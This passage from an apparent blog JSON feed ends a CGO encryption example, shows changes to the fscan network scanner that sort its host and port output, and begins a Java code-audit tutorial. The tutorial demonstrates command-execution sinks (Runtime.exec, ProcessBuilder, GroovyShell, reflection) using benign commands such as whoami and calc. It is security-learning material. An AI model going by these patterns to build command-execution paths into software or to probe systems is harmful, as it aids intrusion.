punctuation\">(</span>cMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">// Decrypt the message</span>\n    C<span class=\"token punctuation\">.</span><span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>cMessage<span class=\"token punctuation\">)</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Decrypted message: %s\\n\"</span><span class=\"token punctuation\">,</span> C<span class=\"token punctuation\">.</span><span class=\"token function\">GoString</span><span class=\"token punctuation\">(</span>cMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在这个示例中，Go 代码通过 <code>import \"C\"</code> 引入 CGO，然后使用 <code>// #cgo</code> 指令来指定编译选项。在 <code>main</code> 函数中，我们首先将 Go 字符串转换为 C 字符串，然后调用 C 函数来加密和解密字符串，最后将结果打印出来。</p>\n<p><strong>4. 构建和运行程序</strong></p>\n<p>在包含以上文件的目录中，可以通过以下命令构建和运行这个示例程序：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>go build <span class=\"token parameter variable\">-o</span> crypto\n./crypto\n</code></pre></div><p>程序应该输出以下内容：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Encrypted message: LQYYX;#rNXVX\nDecrypted message: Hello, world!\n</code></pre></div>",
      "date_published": "2024-08-18T14:17:30.000Z",
      "date_modified": "2024-09-04T09:28:48.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "2. Go练习-fscan",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/ImprovingGo/2_fscanPro.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/ImprovingGo/2_fscanPro.html",
      "summary": "2. Go练习-fscan\n2.1. 优化存活主机探测结果输出\nPlugins目录下的icmp.go文件中CheckLive函数对应着探测存活主机功能，堆栈：\nimage-20240818193210381image-20240818193210381\n整体逻辑：checkLive函数中创建chanHosts通道，用channel接收多线程探测存活主机...",
      "content_html": "\n<h2>2.1. 优化存活主机探测结果输出</h2>\n<p>Plugins目录下的icmp.go文件中CheckLive函数对应着探测存活主机功能，堆栈：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Plugins.CheckLive (c:\\Users\\18846\\Desktop\\fscan\\Plugins\\icmp.go:23)\nPlugins.Scan (c:\\Users\\18846\\Desktop\\fscan\\Plugins\\scanner.go:27)\nmain.main (c:\\Users\\18846\\Desktop\\fscan\\main.go:15)\n</code></pre></div><figure><figcaption>image-20240818193210381</figcaption></figure>\n<p>整体逻辑：<code>checkLive</code>函数中创建<code>chanHosts</code>通道，用channel接收多线程探测存活主机的结果。</p>\n<p>修改：多线程里<code>chanHosts</code>中的IP不再实时输出，原本的打印逻辑注释掉，只保留扫描结果<code>AliveHosts</code></p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>chanHosts <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>hostslist<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">for</span> ip <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> chanHosts <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> ExistHosts<span class=\"token punctuation\">[</span>ip<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">!</span>ok <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">IsContain</span><span class=\"token punctuation\">(</span>hostslist<span class=\"token punctuation\">,</span> ip<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t\tExistHosts<span class=\"token punctuation\">[</span>ip<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\t\t\t\t<span class=\"token comment\">// if common.Silent == false {</span>\n\t\t\t\t<span class=\"token comment\">// \tif Ping == false {</span>\n\t\t\t\t<span class=\"token comment\">// \t\tfmt.Printf(\"(icmp) Target %-15s is alive\\n\", ip)</span>\n\t\t\t\t<span class=\"token comment\">// \t} else {</span>\n\t\t\t\t<span class=\"token comment\">// \t\tfmt.Printf(\"(ping) Target %-15s is alive\\n\", ip)</span>\n\t\t\t\t<span class=\"token comment\">// \t}</span>\n\t\t\t\t<span class=\"token comment\">// }</span>\n\t\t\t\tAliveHosts <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>AliveHosts<span class=\"token punctuation\">,</span> ip<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\tlivewg<span class=\"token punctuation\">.</span><span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre></div><p>在<code>AliveHosts</code>返回之前对其进行排序并输出</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\t<span class=\"token comment\">// Sort the AliveHosts slice</span>\n\tsort<span class=\"token punctuation\">.</span><span class=\"token function\">Strings</span><span class=\"token punctuation\">(</span>AliveHosts<span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// Print sorted AliveHosts</span>\n\t<span class=\"token keyword\">if</span> Ping <span class=\"token operator\">==</span> <span class=\"token boolean\">false</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> ip <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> AliveHosts <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(icmp) Target %-15s is alive\\n\"</span><span class=\"token punctuation\">,</span> ip<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> ip <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> AliveHosts <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(ping) Target %-15s is alive\\n\"</span><span class=\"token punctuation\">,</span> ip<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> AliveHosts\n</code></pre></div><p>缺点：要等到全部存活探测结束才有输出</p>\n<p>优点：有排序，不会太乱</p>\n<p>但是，结果跑出来发现排序不对</p>\n<figure><figcaption>image-20240818214317217</figcaption></figure>\n<p>修改一下排序的逻辑，不直接用<code>sort.Strings</code>了,使用<code>net</code>包中的<code>ParseIP</code>函数，解析一下IP再排序</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\t<span class=\"token comment\">// sort.Strings(AliveHosts)</span>\n\tsort<span class=\"token punctuation\">.</span><span class=\"token function\">Slice</span><span class=\"token punctuation\">(</span>AliveHosts<span class=\"token punctuation\">,</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> bytes<span class=\"token punctuation\">.</span><span class=\"token function\">Compare</span><span class=\"token punctuation\">(</span>net<span class=\"token punctuation\">.</span><span class=\"token function\">ParseIP</span><span class=\"token punctuation\">(</span>AliveHosts<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">To4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> net<span class=\"token punctuation\">.</span><span class=\"token function\">ParseIP</span><span class=\"token punctuation\">(</span>AliveHosts<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">To4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span>\n\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n</code></pre></div><p>这回应该没啥问题了，就是不知道效率被影响的程度，毕竟多解析了一遍IP，等用的时候再说吧</p>\n<h2>2.2. 优化端口探测结果输出</h2>\n<p>fscan 端口扫描函数调用堆栈</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Plugins.PortScan (portscan.go:48) github.com/shadow1ng/fscan/Plugins\nPlugins.Scan (scanner.go:40) github.com/shadow1ng/fscan/Plugins\nmain.main (main.go:15) main\nruntime.main (proc.go:250) runtime\n</code></pre></div><figure><figcaption>image-20240819095429072</figcaption></figure>\n<p>原本的探测结果在<code>PortConnect()</code>函数。一边扫描一边就输出，这样太乱了。但是也有对应的接收结果的 <code>results</code> channel, 那直接删除掉原本的输出，处理 <code>AliveAddress</code> 结果即可 修改代码如下</p>\n<figure><figcaption>image-20240819095521796</figcaption></figure>\n<p>在<code>PortConnect()</code>函数中<code>AliveAddress</code> 返回之前，处理一遍结果。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">PortScan</span><span class=\"token punctuation\">(</span>hostslist <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> ports <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> timeout <span class=\"token builtin\">int64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//</span>\n\t<span class=\"token comment\">// 中间省略</span>\n    <span class=\"token comment\">// </span>\n\twg<span class=\"token punctuation\">.</span><span class=\"token function\">Wait</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>Addrs<span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>results<span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">MapIPToPorts</span><span class=\"token punctuation\">(</span>AliveAddress<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> AliveAddress\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">MapIPToPorts</span><span class=\"token punctuation\">(</span>ipPortList <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tipToPorts <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// 遍历列表，解析IP和端口，并将端口添加到对应IP的列表中</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> ipPort <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> ipPortList <span class=\"token punctuation\">{</span>\n\t\tparts <span class=\"token operator\">:=</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">Split</span><span class=\"token punctuation\">(</span>ipPort<span class=\"token punctuation\">,</span> <span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span>\n\t\tip <span class=\"token operator\">:=</span> parts<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n\t\tport<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">:=</span> strconv<span class=\"token punctuation\">.</span><span class=\"token function\">Atoi</span><span class=\"token punctuation\">(</span>parts<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\t\tipToPorts<span class=\"token punctuation\">[</span>ip<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>ipToPorts<span class=\"token punctuation\">[</span>ip<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token keyword\">for</span> ip<span class=\"token punctuation\">,</span> ports <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> ipToPorts <span class=\"token punctuation\">{</span>\n\t\tsort<span class=\"token punctuation\">.</span><span class=\"token function\">Ints</span><span class=\"token punctuation\">(</span>ports<span class=\"token punctuation\">)</span>\n\t\tresult <span class=\"token operator\">:=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" %s: %v\"</span><span class=\"token punctuation\">,</span> ip<span class=\"token punctuation\">,</span> ports<span class=\"token punctuation\">)</span>\n\t\tcommon<span class=\"token punctuation\">.</span><span class=\"token function\">LogSuccess</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>结果大概这样</p>\n<figure><figcaption>image-20240819101048478</figcaption></figure>\n",
      "date_published": "2024-08-18T14:17:30.000Z",
      "date_modified": "2024-08-19T02:25:45.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "Java常见漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/JavaVul.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/JavaVul.html",
      "summary": "Java常见漏洞\n命令执行\nJava中实现命令执行的方式：\n\n反射\nRuntime.getRuntime.exec\nProcessBuilder\ngroovy_shell\n\n代码审计时，查找可用于命令执行的相关关键字如groovy、Runtime.getRuntime.exec、ProcessBuilder  、Class.forName等，找到对应的...",
      "content_html": "\n<h2>命令执行</h2>\n<p>Java中实现命令执行的方式：</p>\n<ul>\n<li>反射</li>\n<li><code>Runtime.getRuntime.exec</code></li>\n<li><code>ProcessBuilder</code></li>\n<li><code>groovy_shell</code></li>\n</ul>\n<p>代码审计时，查找可用于命令执行的相关关键字如<code>groovy</code>、<code>Runtime.getRuntime.exec</code>、<code>ProcessBuilder  </code>、<code>Class.forName</code>等，找到对应的地址后跟踪方法调用栈，最后找他的入口点即客户端传参获取地点进行分析</p>\n<p><strong>示例代码1：使用 <code>Runtime.getRuntime().exec()</code></strong></p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">BufferedReader</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InputStreamReader</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CommandExecutor</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">Process</span> process <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"calc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">BufferedReader</span> reader <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">InputStreamReader</span><span class=\"token punctuation\">(</span>process<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">String</span> line<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>line <span class=\"token operator\">=</span> reader<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><strong>示例代码2：使用 <code>ProcessBuilder</code></strong></p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">BufferedReader</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InputStreamReader</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ProcessBuilderDemo</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">ProcessBuilder</span> builder <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ProcessBuilder</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ipconfig\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">Process</span> process <span class=\"token operator\">=</span> builder<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">BufferedReader</span> reader <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">InputStreamReader</span><span class=\"token punctuation\">(</span>process<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">String</span> line<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>line <span class=\"token operator\">=</span> reader<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p><strong>示例代码3：使用<code>GroovyShell</code></strong></p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">groovy<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">GroovyShell</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> groovyShellDemo <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">GroovyShell</span> shell <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">GroovyShell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">String</span> cmd <span class=\"token operator\">=</span> <span class=\"token string\">\"\\\"whoami\\\".execute().text\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>shell<span class=\"token punctuation\">.</span><span class=\"token function\">evaluate</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>类似的还有很多，还可以远程加载脚本，参考<a href=\"https://www.cnblogs.com/yyhuni/p/18012041\" target=\"_blank\" rel=\"noopener noreferrer\">Groovy命令执行指南 - Atomovo - 博客园 (cnblogs.com)</a></p>\n<p><strong>示例代码4：反射调用之一</strong></p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">BufferedReader</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InputStreamReader</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Class</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> reflectDemo <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">NoSuchMethodException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InvocationTargetException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IllegalAccessException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">&gt;</span></span> c <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.Runtime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//获取类</span>\n        <span class=\"token class-name\">Method</span> m1 <span class=\"token operator\">=</span>  c<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//获取getRuntime方法，用于创建对象</span>\n        <span class=\"token class-name\">Method</span> m2 <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//获取exec方法，用于执行命令</span>\n        <span class=\"token class-name\">Object</span> obj <span class=\"token operator\">=</span>  m1<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//创建对象</span>\n        <span class=\"token class-name\">Process</span> process <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Process</span><span class=\"token punctuation\">)</span> m2<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span><span class=\"token string\">\"whoami\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//反射调用</span>\n        <span class=\"token comment\">// 下面可以不要，直接m2.invoke(obj,\"whoami\"); 只是没回显</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">BufferedReader</span> reader <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">InputStreamReader</span><span class=\"token punctuation\">(</span>process<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">String</span> line<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>line <span class=\"token 